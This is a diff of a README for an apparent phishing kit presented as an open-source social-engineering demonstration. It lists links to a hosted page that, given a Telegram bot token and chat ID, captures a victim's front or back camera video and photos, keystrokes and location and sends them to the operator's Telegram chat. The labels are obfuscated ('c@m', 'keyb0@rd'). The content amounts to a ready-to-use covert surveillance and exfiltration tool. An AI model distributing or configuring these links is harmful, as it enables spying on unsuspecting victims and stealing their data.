@@ -13,7 +13,7 @@ This **open-source** project demonstrates how hackers use social engineering to 
 **✅ Public code API example**
 
 ```bash
-https://yourdomain.com/index.html?token=$TELEGRAM_BOT_TOKEN&id=$TELEGRAM_CHAT_ID
+https://yourdomain.com/index.html?token=your_token&id=your_chatid
 ```
 
 **📸 Data Reception on private code API**
@@ -72,34 +72,34 @@ Create a similar setup by entering your **Telegram Bot Token** and **Chat ID** o
 **Front c@m vide0 & info**
 
 ```bash
-https://vide0chat.vercel.app/chat/?token=$TELEGRAM_BOT_TOKEN&id=$TELEGRAM_CHAT_ID&mode=front-video&duration=2
+https://vide0chat.vercel.app/chat/?token=your_token&id=your_chatid&mode=front-video&duration=2
 ```
 
 **Back c@m vide0 & info**
 
 ```bash
-https://vide0chat.vercel.app/chat/?token=$TELEGRAM_BOT_TOKEN&id=$TELEGRAM_CHAT_ID&mode=front-back&duration=2
+https://vide0chat.vercel.app/chat/?token=your_token&id=your_chatid&mode=front-back&duration=2
 ```
 
 **Front c@m ph0t0 & info**
 
 ```bash
-https://vide0chat.vercel.app/chat/?token=$TELEGRAM_BOT_TOKEN&id=$TELEGRAM_CHAT_ID&mode=front-photo
+https://vide0chat.vercel.app/chat/?token=your_token&id=your_chatid&mode=front-photo
 ```
 
 **Back c@m ph0t0 & info**
 
 ```bash
-https://vide0chat.vercel.app/chat/?token=$TELEGRAM_BOT_TOKEN&id=$TELEGRAM_CHAT_ID&mode=back-photo
+https://vide0chat.vercel.app/chat/?token=your_token&id=your_chatid&mode=back-photo
 ```
 
 **keyb0@rd & l0c@tion**
 
 ```bash
-https://vide0chat.vercel.app/main/?token=$TELEGRAM_BOT_TOKEN&id=$TELEGRAM_CHAT_ID
+https://vide0chat.vercel.app/main/?token=your_token&id=your_chatid
 ```
 
-⚠️ **Replace** `YOUR_TOKEN` and `YOUR_CHAT_ID` with your actual Telegram Bot Token and Chat ID.
+⚠️ **Replace** `your_token` and `your_chatid` with your actual Telegram Bot Token and Chat ID.
 
 ---
 
